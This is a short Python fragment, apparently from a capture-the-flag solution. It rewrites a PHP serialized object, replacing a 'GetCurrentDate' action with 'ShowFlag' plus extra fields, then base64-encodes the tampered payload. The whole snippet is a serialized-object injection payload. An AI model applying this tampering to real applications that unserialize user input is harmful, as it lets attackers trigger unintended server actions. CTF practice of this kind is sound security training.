import base64
mtucx = data.replace("\":1:{s:6:\"action\";s:14:\"GetCurrentDate\";}}", "\":3:{s:4:\"time\";s:4:\"1235\";s:4:\"flag\";s:7:\"Please?\";s:6:\"action\";s:8:\"ShowFlag\";}}")
print mtucx
print base64.b64encode(mtucx)